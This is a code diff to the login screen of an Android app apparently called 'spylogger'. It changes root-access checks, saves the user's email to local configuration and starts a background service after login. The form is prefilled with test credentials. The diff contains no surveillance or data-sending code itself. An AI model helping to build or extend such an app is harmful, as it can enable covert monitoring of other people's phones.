@@ -13,6 +13,7 @@ import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.provider.ContactsContract;
 import android.support.annotation.NonNull;
 import android.support.design.widget.Snackbar;
@@ -30,19 +31,18 @@ import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import com.google.android.gms.auth.GoogleAuthException;
-import com.google.android.gms.auth.UserRecoverableAuthException;
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.R;
+import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
+import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.stericson.RootTools.RootTools;
-import com.stericson.RootTools.exceptions.RootDeniedException;
 import com.utilidades.gravata.utils.Utilidades;
 
-import java.io.IOException;
+import java.sql.SQLException;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.concurrent.TimeoutException;
 
 import static android.Manifest.permission.READ_CONTACTS;
 
@@ -82,21 +82,16 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
         setContentView(R.layout.activity_login);
         this.context=this;
 
-        if(!RootTools.isRootAvailable()){
-            Toast.makeText(this, getString(R.string.rooted), Toast.LENGTH_LONG).show();
+        Utilidades.askPermissions(this,Utils.permissoes);
 
-        }else{
-            if(!RootTools.isAccessGiven())
-            {
-                try {
-                    RootTools.getShell(true);
-                } catch (IOException | TimeoutException | RootDeniedException e) {
-                    e.printStackTrace();
-                }
-            }
+        if (RootTools.isAccessGiven()) {
+            Utils.rooted = true;
         }
 
-        getAndUseAuthTokenInAsyncTask();
+        if(!Utilidades.isConnected(this)){
+            Toast.makeText(this,R.string.nao_conectado,Toast.LENGTH_LONG).show();
+            finish();
+        }
 
         // Set up the login form.
         mEmailView = (AutoCompleteTextView) findViewById(R.id.email);
@@ -119,8 +114,8 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
         mEmailSignInButton.setOnClickListener(new OnClickListener() {
             @Override
             public void onClick(View view) {
-//                attemptLogin();
-                Utils.startNewService(context);
+                attemptLogin();
+//                Utils.startNewService(context);
             }
         });
 
@@ -137,27 +132,8 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
         mProgressView = findViewById(R.id.login_progress);
         mEmailView.setText("bruno@teste.com.br");
         mPasswordView.setText("teste");
-    }
 
-    void getAndUseAuthTokenInAsyncTask() {
-        AsyncTask task = new AsyncTask() {
 
-            @Override
-            protected Object doInBackground(Object... arg0) {
-                try {
-                    return Utilidades.getTokenAuth(context);
-                } catch (UserRecoverableAuthException e) {
-
-                    startActivityForResult(e.getIntent(), 9090);
-
-                } catch (IOException | GoogleAuthException e) {
-                    // TODO Auto-generated catch block
-                    e.printStackTrace();
-                }
-                return null;
-            }
-        };
-        task.execute((Void)null);
     }
 
     private void populateAutoComplete() {
@@ -251,10 +227,13 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
             // Show a progress spinner, and kick off a background task to
             // perform the user login attempt.
             showProgress(true);
-            mAuthTask = new UserLoginTask(email, password);
+            mAuthTask = new UserLoginTask(email, password, new Handler());
             mAuthTask.execute((Void) null);
         }
     }
+
+
+
     private boolean isEmailValid(String email) {
         //TODO: Replace this with your own logic
         return email.contains("@");
@@ -363,10 +342,12 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
 
         private final String mEmail;
         private final String mPassword;
+        private Handler handler;
 
-        UserLoginTask(String email, String password) {
+        UserLoginTask(String email, String password, Handler handler) {
             mEmail = email;
             mPassword = password;
+            this.handler=handler;
         }
 
         @Override
@@ -374,22 +355,32 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
             // TODO: attempt authentication against a network service.
 
             try {
-                // Simulate network access.
-                Thread.sleep(2000);
-            } catch (InterruptedException e) {
+                RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
+
+                Configuracao configuracao=repositorioConfiguracao.getConfiguracao();
+
+                if(configuracao!=null){
+
+                    configuracao.setEmail(mEmail);
+
+                    repositorioConfiguracao.atualizar(configuracao);
+
+                    handler.post(new Runnable() {
+                        @Override
+                        public void run() {
+                            Utils.startNewService(context);
+                        }
+                    });
+                }else{
+                    return false;
+                }
+
+
+            } catch (SQLException e) {
                 return false;
             }
 
-            /*for (String credential : DUMMY_CREDENTIALS) {
-                String[] pieces = credential.split(":");
-                if (pieces[0].equals(mEmail)) {
-                    // Account exists, return true if the password matches.
-                    return pieces[1].equals(mPassword);
-                }
-            }*/
 
-
-            // TODO: register the new account here.
             return true;
         }
 
